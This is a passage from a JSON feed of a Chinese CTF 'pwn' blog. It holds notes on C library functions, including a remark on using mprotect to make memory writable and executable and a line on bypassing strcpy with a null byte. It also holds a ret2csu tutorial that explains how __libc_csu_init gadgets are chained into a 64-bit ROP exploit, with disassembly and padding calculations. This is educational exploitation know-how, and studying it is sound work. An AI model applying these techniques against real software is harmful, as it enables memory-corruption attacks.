data-url=\"aHR0cHM6Ly9jLmJpYW5jaGVuZy5uZXQvdmlldy84NjA3Lmh0bWw=\">https://c.biancheng.net/view/8607.html</span></p>\n<h1 id=\"29pthread_join函数-等待线程执行结束\"><a class=\"anchor\" href=\"#29pthread_join函数-等待线程执行结束\">#</a> 29.pthread_join () 函数 【等待线程执行结束】</h1>\n<p>pthread_join () 函数声明在 &lt; pthread.h&gt; 头文件中，语法格式如下</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">pthread_join</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">pthread_t</span> thread<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span> retval<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>thread 参数用于指定接收哪个线程的返回值；retval 参数表示接收到的返回值，如果 <code> thread</code>  线程没有返回值，又或者我们不需要接收 <code> thread</code>  线程的返回值，可以将 <code>retval</code>  参数置为 NULL。</p>\n<p><code>pthread_join() </code> 函数会一直阻塞调用它的线程，直至目标线程执行结束（接收到目标线程的返回值），阻塞状态才会解除。如果  <code>pthread_join()</code>  函数成功等到了目标线程执行结束（成功获取到目标线程的返回值），返回值为数字 0；反之如果执行失败，函数会根据失败原因返回相应的非零值，每个非零值都对应着不同的宏，例如：</p>\n<ul>\n<li>EDEADLK：检测到线程发生了死锁。</li>\n<li>EINVAL：分为两种情况，要么目标线程本身不允许其它线程获取它的返回值，要么事先就已经有线程调用  <code>pthread_join() </code> 函数获取到了目标线程的返回值。</li>\n<li>ESRCH：找不到指定的 thread 线程。</li>\n</ul>\n<p>再次强调，一个线程执行结束的返回值只能由一个  <code>pthread_join() </code> 函数获取，当有多个线程调用 <code>pthread_join()</code>  函数获取同一个线程的执行结果时，哪个线程最先执行  <code>pthread_join()</code>  函数，执行结果就由那个线程获得，其它线程的 <code>pthread_join()</code>  函数都将执行失败。</p>\n<p>对于一个默认属性的线程 A 来说，线程占用的资源并不会因为 <code>执行结束</code>  (线程自己执行结束) 而得到释放。而通过在其它线程中执行 <code>pthread_join(A,NULL);</code>  语句，可以轻松实现 “及时释放线程 A 所占资源” 的目的</p>\n<h1 id=\"30关于指针\"><a class=\"anchor\" href=\"#30关于指针\">#</a> 30. 关于指针</h1>\n<p>取值运算（ <code>*p</code> ）返回保存在 <code>内存地址为</code>  p 的内存空间中的值【 <code>*p</code>  时 p 本身会被看作为一个地址】。取地址（&amp;p）运算则返回操作数 p 的内存地址</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3poLWhhbnMvJUU2JThDJTg3JUU2JUE4JTk5XyglRTklOUIlQkIlRTglODUlQTYlRTclQTclOTElRTUlQUQlQjgp\">https://zh.wikipedia.org/zh-hans/ 指標_(電腦科學)</span></p>\n<h1 id=\"31dlopen函数\"><a class=\"anchor\" href=\"#31dlopen函数\">#</a> 31.dlopen 函数</h1>\n<p><code>dlopen（）</code> 是一个计算机函数，功能是以指定模式打开指定的动态链接库文件，并返回一个句柄给 <code>dlsym（）</code> 的调用进程。使用 <code>dlclose（）</code> 来卸载 (关闭) 打开的库。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span> <span class=\"token function\">dlopen</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> pathname<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> mode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>功能：</p>\n<pre><code>打开一个动态链接库，并返回动态链接库的句柄\n</code></pre>\n<p>这里的句柄实际上是一个数据，是一个 Long (整长型) 的数据，是一种指向指针的指针，是一个标识符，是拿来标识对象或者项目的（这里用来表示了 <code>动态库</code> ）</p>\n<p>参数：</p>\n<ul>\n<li>\n<ul>\n<li>pathname: 以 null 结尾的字符串文件名命名的动态共享对象（共享库）文件 (为该动态库的文件命)</li>\n</ul>\n</li>\n<li>\n<p>mode：mode 是打开方式</p>\n<p>1、解析方式<br />\n RTLD_LAZY：在 dlopen 返回前，对于动态库中的未定义的符号不执行解析（只对函数引用有效，对于变量引用总是立即解析）。<br />\nRTLD_NOW： 需要在 dlopen 返回前，解析出所有未定义符号，如果解析不出来，在 dlopen 会返回 NULL，错误为 symbol: xxxx.......</p>\n<p>2、作用范围，可与解析方式通过 “|” 组合使用。<br />\nRTLD_GLOBAL：动态库中定义的符号可被其后打开的其它库解析。<br />\nRTLD_LOCAL： 与 RTLD_GLOBAL 作用相反，动态库中定义的符号不能被其后打开的其它库重定位。如果没有指明是 RTLD_GLOBAL 还是 RTLD_LOCAL，则缺省为 RTLD_LOCAL。</p>\n<p>3、作用方式<br />\n RTLD_NODELETE： 在 dlclose () 期间不卸载库，并且在以后使用 dlopen () 重新加载库时不初始化库中的静态变量。这个 flag 不是 POSIX-2001 标准。<br />\nRTLD_NOLOAD： 不加载库。可用于测试库是否已加载 (dlopen () 返回 NULL 说明未加载，否则说明已加载），也可用于改变已加载库的 flag，如：先前加载库的 flag 为 RTLD_LOCAL，用 dlopen (RTLD_NOLOAD|RTLD_GLOBAL) 后 flag 将变成 RTLD_GLOBAL。这个 flag 不是 POSIX-2001 标准。<br />\nRTLD_DEEPBIND：在搜索全局符号前先搜索库内的符号，避免同名符号的冲突。这个 flag 不是 POSIX-2001 标准。</p>\n</li>\n</ul>\n<p>返回值:</p>\n<pre><code>打开错误返回NULL\n成功，返回库引用\n</code></pre>\n<h1 id=\"32dlsym函数\"><a class=\"anchor\" href=\"#32dlsym函数\">#</a> 32.dlsym 函数</h1>\n<p>dlsym 是一个计算机函数，功能是根据动态链接库操作句柄与符号，返回符号对应的地址，不但可以 <code>获取函数地址</code> ，也可以 <code>获取变量地址</code> 。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">dlsym</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>handle<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>symbol<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>参数：</p>\n<ul>\n<li>handle：由 <code>dlopen</code>  打开动态链接库后返回的指针；</li>\n<li>symbol：要求获取的函数或全局变量的名称。</li>\n</ul>\n<p>返回值:</p>\n<p>void* 指向函数的地址，供调用使用。</p>\n<h1 id=\"33mprotect函数\"><a class=\"anchor\" href=\"#33mprotect函数\">#</a> 33.mprotect 函数</h1>\n<p>有  <code>mprotect 函数</code> 可以<strong>改变内存的读写权限</strong> mprotect (起始地址，修改内存长度，修改的权限（修改为 7）)，起始地址必须包含整个页（4k， <code>起始地址末尾为 000</code> ）</p>\n<h1 id=\"34strcat函数\"><a class=\"anchor\" href=\"#34strcat函数\">#</a> 34.strcat 函数</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token function\">strcat</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>dest<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>src<span class=\"token punctuation\">)</span>  <span class=\"token comment\">// 把 src 所指向的字符串追加到 dest 所指向的字符串的结尾</span></pre></td></tr></table></figure><h1 id=\"35strchr函数\"><a class=\"anchor\" href=\"#35strchr函数\">#</a> 35.strchr () 函数</h1>\n<p>strchr () 用于查找字符串中的一个字符，并返回该字符在字符串中第一次出现的位置</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token function\">strchr</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>str<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> c<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 在参数 str 所指向的字符串中搜索第一次出现字符 c（一个无符号字符）的位置</span></pre></td></tr></table></figure><ul>\n<li><strong>str</strong> -- 要查找的字符串。</li>\n<li><strong>c</strong> -- 要查找的字符。</li>\n</ul>\n<h3 id=\"返回值\"><a class=\"anchor\" href=\"#返回值\">#</a> 返回值</h3>\n<p>如果在字符串 str 中找到字符 c，则函数返回<strong>指向该字符的指针</strong>，如果未找到该字符则返回 NULL</p>\n<h1 id=\"36strcpy函数\"><a class=\"anchor\" href=\"#36strcpy函数\">#</a> 36.strcpy () 函数</h1>\n<p>把 <strong>src</strong> 所指向的字符串复制到 <strong>dest</strong>（strcpy 把从 src 地址开始且含有’\\0’结束符的字符串复制到以 dest 开始的地址空间）</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>dest<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>src<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><ul>\n<li><strong>dest</strong> -- 指向用于存储复制内容的目标数组。</li>\n<li><strong>src</strong> -- 要复制的字符串。</li>\n</ul>\n<p><strong>返回值：</strong></p>\n<p>该函数返回一个指向最终的目标字符串 dest 的指针。</p>\n<h3 id=\"绕过\"><a class=\"anchor\" href=\"#绕过\">#</a> 绕过</h3>\n<p>可以输入通过 <code>\\0</code>  结束符来欺骗性的使其函数结束复制</p>\n",
            "tags": [
                "pwn",
                "C语言"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/24/pwn/%E4%B8%93%E6%A0%8F/ret2csu/",
            "url": "https://vvwwvv.cn/2023/08/24/pwn/%E4%B8%93%E6%A0%8F/ret2csu/",
            "title": "64位构造通用ROP，ret2csu",
            "date_published": "2023-08-24T11:23:15.000Z",
            "content_html": "<h1 id=\"ret2csu\"><a class=\"anchor\" href=\"#ret2csu\">#</a> ret2csu</h1>\n<h2 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h2>\n<ul>\n<li>64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候我们很难找到每个寄存器对应的 gadges。这时候，我们可以利用 x64 下的__libc_csu_init 中的 gadgets。</li>\n<li>这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</li>\n</ul>\n<h4 id=\"下面借用别人在ida摘出来的__libc_csu_init函数的汇编指令\"><a class=\"anchor\" href=\"#下面借用别人在ida摘出来的__libc_csu_init函数的汇编指令\">#</a> 下面借用别人在 IDA 摘出来的__libc_csu_init 函数的汇编指令</h4>\n<pre><code>.text:00000000004011B0 ; void _libc_csu_init(void)\n.text:00000000004011B0                 public __libc_csu_init\n.text:00000000004011B0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o\n.text:00000000004011B0 ; __unwind &#123;\n.text:00000000004011B0                 push    r15\n.text:00000000004011B2                 mov     r15, rdx\n.text:00000000004011B5                 push    r14\n.text:00000000004011B7                 mov     r14, rsi\n.text:00000000004011BA                 push    r13\n.text:00000000004011BC                 mov     r13d, edi\n.text:00000000004011BF                 push    r12\n.text:00000000004011C1                 lea     r12, __frame_dummy_init_array_entry\n.text:00000000004011C8                 push    rbp\n.text:00000000004011C9                 lea     rbp, __do_global_dtors_aux_fini_array_entry\n.text:00000000004011D0                 push    rbx\n.text:00000000004011D1                 sub     rbp, r12\n.text:00000000004011D4                 sub     rsp, 8\n.text:00000000004011D8                 call    _init_proc\n.text:00000000004011DD                 sar     rbp, 3\n.text:00000000004011E1                 jz      short loc_4011FE\n.text:00000000004011E3                 xor     ebx, ebx\n.text:00000000004011E5                 nop     dword ptr [rax]\n.text:00000000004011E8\n</code></pre>\n<p>gadgets2:</p>\n<pre><code>.text:00000000004011E8 loc_4011E8:                             ; CODE XREF: __libc_csu_init+4C↓j\n.text:00000000004011E8                 mov     rdx, r15\n.text:00000000004011EB                 mov     rsi, r14\n.text:00000000004011EE                 mov     edi, r13d\n.text:00000000004011F1                 call    qword ptr [r12+rbx*8]\n.text:00000000004011F5                 add     rbx, 1\n.text:00000000004011F9                 cmp     rbp, rbx\n.text:00000000004011FC                 jnz     short loc_4011E8\n.text:00000000004011FE\n</code></pre>\n<p>gadgets1:</p>\n<pre><code>.text:00000000004011FE loc_4011FE:                             ; CODE XREF: __libc_csu_init+31↑j\n.text:00000000004011FE                 add     rsp, 8\n.text:0000000000401202                 pop     rbx\n.text:0000000000401203                 pop     rbp\n.text:0000000000401204                 pop     r12\n.text:0000000000401206                 pop     r13\n.text:0000000000401208                 pop     r14\n.text:000000000040120A                 pop     r15\n.text:000000000040120C                 retn\n.text:000000000040120C ; &#125; // starts at 4011B0\n.text:000000000040120C __libc_csu_init endp\n</code></pre>\n<p>这里搬运之前在 CSDN 上发的文章（汇编代码执行顺序为先 gadgets2, 然后 gadgets1）</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/8abb18a591a445808abc86226a99d2c9.png\" alt=\"\" /></p>\n<p>pop 命令 会把栈中的值存入相应的寄存器中，那么我们可以通过往栈中写对应的数据来存入寄存器里</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/8400e847c08a419ba7c04f174dc26712.png\" alt=\"\" /></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cmp</span>     rbx, rbp   //cpm后的不同的调整指令有着不同的作用，这里 jnz 比较结果相同不跳转，不相同就跳转</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>jnz     short loc_400580</pre></td></tr></table></figure><p>最后第二次回到 gadget1 时，此时已经给寄存器赋值完毕只需要回到 ret，此处填充 56 个 padding 字符是因为在地址 0x4011FE 处有   <code>add rsp , 8 </code>  这会把 rsp 栈提高 8，所以要填充 8 个字符来站这个位置，后面的  <code>pop rbx ~ pop r15</code>  共有 6 个寄存器，pop 了 6 次，所以总共是 （6+1）*8=56，所以填充 56 个字符即可到 ret 来控制程序执行</p>\n<p>例题:<a href=\"https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/\" title=\"ret2csu\">https://vvwwvv.cn/2023/05/04/pwn/ 刷题 / 看雪社区 / 看雪社区 pwn8 (64 位构造通用 ROP,ret2csu)/</a></p>\n",
            "tags": [
                "pwn",
                "ret2csu"
            ]
        }
    ]
}